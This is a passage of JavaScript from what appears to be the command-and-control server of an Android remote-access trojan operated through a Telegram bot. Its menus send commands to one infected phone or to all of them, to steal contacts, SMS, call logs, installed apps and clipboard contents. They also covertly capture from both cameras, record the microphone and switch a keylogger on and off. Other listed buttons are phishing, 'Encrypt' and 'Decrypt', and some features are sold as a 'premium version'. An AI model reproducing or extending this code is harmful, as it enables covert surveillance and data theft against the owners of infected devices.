                                  'keyboard': [["👁️‍🗨️ <b>𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚂𝙼𝚂</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙲𝚊𝚕𝚕𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚙𝚙𝚜</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚃𝚘𝚊𝚜𝚝</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝚂𝚎𝚗𝚍 𝚂𝙼𝚂</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚅𝚒𝚋𝚛𝚊𝚝𝚎</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙶𝚊𝚕𝚕𝚎𝚛𝚢</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙴𝚗𝚌𝚛𝚢𝚙𝚝</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙳𝚎𝚌𝚛𝚢𝚙𝚝</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙾𝚙𝚎𝚗 𝚄𝚁𝙻</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b> 👁️‍🗨️"]],
                                  'resize_keyboard': true,
                                  'one_time_keyboard': true
                                }
                              });
                            } else {
                              bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 " + _0x3202e5 + "</b>\n\n", {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [["👁️‍🗨️ <b>𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚂𝙼𝚂</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙲𝚊𝚕𝚕𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚙𝚙𝚜</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚃𝚘𝚊𝚜𝚝</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝚂𝚎𝚗𝚍 𝚂𝙼𝚂</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚅𝚒𝚋𝚛𝚊𝚝𝚎</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙶𝚊𝚕𝚕𝚎𝚛𝚢</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙴𝚗𝚌𝚛𝚢𝚙𝚝</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙳𝚎𝚌𝚛𝚢𝚙𝚝</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙾𝚙𝚎𝚗 𝚄𝚁𝙻</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b> 👁️‍🗨️"]],
                                  'resize_keyboard': true,
                                  'one_time_keyboard': true
                                }
                              });
                            }
                          } else {
                            if (actions.includes(_0xdbde0c.text)) {
                              let _0x3ea82b = appData.get("currentTarget");
                              if (_0xdbde0c.text === "👁️‍🗨️ <b>𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜</b> 👁️‍🗨️") {
                                if (_0x3ea82b == "all") {
                                  io.sockets.emit("commend", {
                                    'request': "contacts",
                                    'extras': []
                                  });
                                } else {
                                  io.to(_0x3ea82b).emit("commend", {
                                    'request': 'contacts',
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n👁️‍🗨️ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "👁️‍🗨️ <b>𝚂𝙼𝚂</b> 👁️‍🗨️") {
                                if (_0x3ea82b == "all") {
                                  io.to(_0x3ea82b).emit("commend", {
                                    'request': "all-sms",
                                    'extras': []
                                  });
                                } else {
                                  io.sockets.emit("commend", {
                                    'request': "all-sms",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n👁️‍🗨️ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "👁️‍🗨️ <b>𝙲𝚊𝚕𝚕𝚜</b> 👁️‍🗨️") {
                                if (_0x3ea82b == "all") {
                                  io.sockets.emit("commend", {
                                    'request': "calls",
                                    'extras': []
                                  });
                                } else {
                                  io.to(_0x3ea82b).emit("commend", {
                                    'request': "calls",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n👁️‍🗨️ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "👁️‍🗨️ <b>𝙰𝚙𝚙𝚜</b> 👁️‍🗨️") {
                                if (_0x3ea82b == "all") {
                                  io.sockets.emit("commend", {
                                    'request': "apps",
                                    'extras': []
                                  });
                                } else {
                                  io.to(_0x3ea82b).emit("commend", {
                                    'request': "apps",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n👁️‍🗨️ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "👁️‍🗨️ <b>𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊</b> 👁️‍🗨️") {
                                if (_0x3ea82b == "all") {
                                  io.sockets.emit("commend", {
                                    'request': "main-camera",
                                    'extras': []
                                  });
                                } else {
                                  io.to(_0x3ea82b).emit("commend", {
                                    'request': "main-camera",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n👁️‍🗨️ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "👁️‍🗨️ <b>𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊</b> 👁️‍🗨️") {
                                if (_0x3ea82b == 'all') {
                                  io.sockets.emit("commend", {
                                    'request': "selfie-camera",
                                    'extras': []
                                  });
                                } else {
                                  io.to(_0x3ea82b).emit('commend', {
                                    'request': "selfie-camera",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n👁️‍🗨️ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "👁️‍🗨️ <b>𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍</b> 👁️‍🗨️") {
                                if (_0x3ea82b == "all") {
                                  io.sockets.emit("commend", {
                                    'request': "clipboard",
                                    'extras': []
                                  });
                                } else {
                                  io.to(_0x3ea82b).emit("commend", {
                                    'request': "clipboard",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n👁️‍🗨️ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "👁️‍🗨️ <b>𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝</b> 👁️‍🗨️") {
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy <b>Romeo Uchiha</b></b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "👁️‍🗨️ <b>𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽</b> 👁️‍🗨️") {
                                if (_0x3ea82b == "all") {
                                  io.sockets.emit("commend", {
                                    'request': "keylogger-on",
                                    'extras': []
                                  });
                                } else {
                                  io.to(_0x3ea82b).emit("commend", {
                                    'request': "keylogger-on",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n👁️‍🗨️ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "👁️‍🗨️ <b>𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵</b> 👁️‍🗨️") {
                                if (_0x3ea82b == "all") {
                                  io.sockets.emit("commend", {
                                    'request': "keylogger-off",
                                    'extras': []
                                  });
                                } else {
                                  io.to(_0x3ea82b).emit('commend', {
                                    'request': "keylogger-off",
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n👁️‍🗨️ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "👁️‍🗨️ <b>𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛</b> 👁️‍🗨️") {
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy <b>Romeo Uchiha</b></b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "👁️‍🗨️ <b>𝙶𝚊𝚕𝚕𝚎𝚛𝚢</b> 👁️‍🗨️") {
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy <b>Romeo Uchiha</b></b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "👁️‍🗨️ <b>𝙴𝚗𝚌𝚛𝚢𝚙𝚝</b> 👁️‍🗨️") {
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy <b>Romeo Uchiha</b></b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "👁️‍🗨️ <b>𝙳𝚎𝚌𝚛𝚢𝚙𝚝</b> 👁️‍🗨️") {
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy <b>Romeo Uchiha</b></b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙳𝚎𝚟𝚒𝚌𝚎𝚜</b> 👁️‍🗨️", "👁️‍🗨️ <b>𝙰𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"], ["👁️‍🗨️ <b>𝙰𝚋𝚘𝚞𝚝 𝚞𝚜</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "👁️‍🗨️ <b>𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎</b> 👁️‍🗨️") {
                                appData.set("currentAction", 'microphoneDuration');
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 𝚛𝚎𝚌𝚘𝚛𝚍𝚒𝚗𝚐 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\n\n", {
                                  'parse_mode': 'HTML',
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                              if (_0xdbde0c.text === "👁️‍🗨️ <b>𝚃𝚘𝚊𝚜𝚝</b> 👁️‍🗨️") {
                                appData.set("currentAction", "toastText");
                                bot.sendMessage(chatId, "<b>👁️‍🗨️ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚒𝚗 𝚝𝚘𝚊𝚜𝚝 𝚋𝚘𝚡</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["👁️‍🗨️ <b>𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗</b> 👁️‍🗨️"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
